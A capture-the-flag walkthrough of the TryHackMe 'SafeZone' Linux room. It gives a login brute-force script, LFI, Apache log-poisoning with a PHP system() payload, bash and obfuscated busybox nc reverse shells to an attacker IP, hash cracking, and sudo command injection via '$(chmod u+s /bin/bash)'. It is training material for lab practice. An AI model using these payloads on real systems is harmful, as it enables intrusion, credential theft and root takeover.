---
tags:
  - THM
  - Linux
  - Medium
  - Leakage
  - Scripting
  - Brute-Force
  - LFI
  - Log-Poisoning
  - RCE
  - Sudo
---
https://tryhackme.com/room/safezone/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.66.165.139 safezone.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC safezone.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:6a:cd:1b:0c:69:a1:3b:6c:52:f1:22:93:e0:ad:16 (RSA)
|   256 84:f4:df:87:3a:ed:f2:d6:3f:50:39:60:13:40:1f:4c (ECDSA)
|_  256 9c:1e:af:c8:8f:03:4f:8f:40:d5:48:04:6b:43:f5:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Whoami?
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
## Website Structure
The website is just an ASCII text saying *safezone*. There are 2 sections:
- `/register.php`: register users.
- `/index.php`: log in panel.

After creating an unprivileged user, we can get access to more pages with some hints:
- `/dashboard.php`: welcome message.
- `/news.php`: message suggesting **LFI** and **RCE**.
- `/detail.php`: unavailable feature (need an **admin** account).
## Becoming Admin
Discovered `/~files/` directory:
```console
$ gobuster dir -q -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://safezone.thm

/server-status        (Status: 403) [Size: 277]
/~files               (Status: 301) [Size: 313] [--> http://safezone.thm/~files/]
```
Discovered a hint for the **admin password**:
```console
$ curl -s http://safezone.thm/~files/pass.txt

Admin password hint :-

		admin__admin

				" __ means two numbers are there , this hint is enough I think :) "
```
Create `login.py` script to find the **admin password** considering the waiting time:
```python
import requests
import time

for i in range(99):
    password = f"admin{str(i).zfill(2)}admin"
    data = {
        "username": "admin",
        "password": password,
        "submit": "Submit"
    }
    
    r = requests.post("http://safezone.thm/index.php", data=data)

    invalid = "Please enter valid login" in r.text
    must_wait = "To many failed" in r.text

    if invalid or must_wait:
        print(f"[x] {password}")
    else:
        print(f"[+] {password}")
        break

    if must_wait:
        time.sleep(62)
```
Found the **admin password** after waiting some time (be pacient):
```console
$ python3 login.py
...
[x] admin42admin
[x] admin43admin
[+] admin44admin
```
# Exploitation
After log in as **admin**, found critical HTML comment:
```console
$ curl -s -H 'Cookie: PHPSESSID=io4oq5n92ph3gbeb3i43iu0mfh' 'http://safezone.thm/detail.php' | grep '<!--'

<!-- try to use "page" as GET parameter-->
```
Can read files in local machine:
```console
$ curl -s -H 'Cookie: PHPSESSID=io4oq5n92ph3gbeb3i43iu0mfh' 'http://safezone.thm/detail.php?page=/etc/passwd'
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
yash:x:1000:1000:yash,,,:/home/yash:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
files:x:1001:1001:,,,:/home/files:/bin/bash
```
Can also read log files, so first listen for connections:
```console
$ nc -lvnp 4444
```
Now, do a **log poisoning attack**:
```console
$ curl -s 'http://safezone.thm/' -A "<?php system(\$_GET['cmd']);?>"

$ cmd=$(echo -n 'bash -c "bash -i >& /dev/tcp/192.168.186.238/4444 0>&1"' | urlencode -a)

$ curl -s -H 'Cookie: PHPSESSID=io4oq5n92ph3gbeb3i43iu0mfh' "http://safezone.thm/detail.php?page=/var/log/apache2/access.log&cmd=$cmd"
```
# Post-Exploitation
## Become files
Found password hash for **files user**:
```console
$ whoami
www-data

$ find /home -readable 2>/dev/null
/home
/home/files
/home/files/.local
/home/files/.profile
/home/files/.bash_logout
/home/files/.bashrc
/home/files/pass.txt
/home/files/.something#fake_can@be^here

$ cat /home/files/.something#fake_can@be^here
files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.
```
Save it locally as `files.hash` and crack it:
```console
$ john --wordlist=/usr/share/dict/rockyou.txt files.hash
...
magic            (files)
...
```
## Become yash
Found internal port 8000 open:
```console
$ ss -tulnp | awk '{print $5}' | awk -F ':' '{print $2}' | sort -u

22
3306
53
68
80
8000
```
Forward the port locally. Found that it is an **nginx 403 forbidden page**:
```console
$ ssh -L 8000:localhost:8000 files@safezone.thm
```
The server contains the `/opt` directory, but we can not get its contents:
```console
$ grep -v '#' /etc/nginx/sites-available/default
server {
	listen 127.0.0.1:8000 default_server;


	root /opt;

	index index.php index.html index.htm index.nginx-debian.html;

	server_name _;

	location / {
		try_files $uri $uri/ =404;
	}


	location ~ \.php$ {
		include snippets/fastcgi-php.conf;
	
		fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
	}

	location ~ /\.ht {
		deny all;
	}
}

$ ls /opt
ls: cannot open directory '/opt': Permission denied
```
Found `/login.html` by enumerating:
```console
$ gobuster dir -q -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://localhost:8000

/login.html           (Status: 200) [Size: 462]
...
```
Found `/login.js` by using browser's network tools:
```javascript
var attempt = 3;
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "user" && password == "pass"){
alert ("Login successfully");
window.location = "pentest.php";
return false;
}
else{
attempt --;
alert("You have left "+attempt+" attempt;");
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
return false;
}
}
}
```
At `/pentest.php`, you can submit "messages for ash". If we try to input `sleep 5` for example, the web will wait some seconds, meaning that this is a web shell. So, we wait for connections:
```console
$ nc -lvnp 4445
```
Common reverse shell commands are being filtered, so we submit:
```bash
'bu''syb''ox' 'n''c' 192.168.186.238 4445 -e '/bi''n/s''h'
```
Get the **user flag**:
```console
$ cat /home/yash/flag.txt
```
## Privilege Escalation
Can execute `/root/bk.py` with `sudo` but can not read or modify it:
```console
$ sudo -l
Matching Defaults entries for yash on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User yash may run the following commands on safezone:
    (root) NOPASSWD: /usr/bin/python3 /root/bk.py
    
$ cat /root/bk.py
cat: /root/bk.py: Permission denied
```
The script backups a file:
```console
$ sudo /usr/bin/python3 /root/bk.py
Enter filename: /etc/passwd
Enter destination: /tmp/p
Enter Password: abc

$ cat /tmp/p
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
yash:x:1000:1000:yash,,,:/home/yash:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
files:x:1001:1001:,,,:/home/files:/bin/bash
```
Get the source code of the script:
```console
$ sudo /usr/bin/python3 /root/bk.py
Enter filename: /root/bk.py
Enter destination: /tmp/bk.py
Enter Password: abc

$ cat /tmp/bk.py
import subprocess
import os
file = input("Enter filename: ")
location = input("Enter destination: ")
psswd = input("Enter Password: ")

#subprocess.run(["sshpass -p",psswd,"scp","-o","trictHostKeyChecking=no",file,location],shell=True)
os.system("sshpass -p "+psswd+" scp -o StrictHostKeyChecking=no "+file+" "+location+" 2>/dev/null")
```
Inject code, become **root** and get the **root flag**:
```console
$ sudo /usr/bin/python3 /root/bk.py
Enter filename: $(chmod u+s /bin/bash)# 
Enter destination: /tmp/b
Enter Password: abc

$ /bin/bash -p

# cat /root/root.txt
```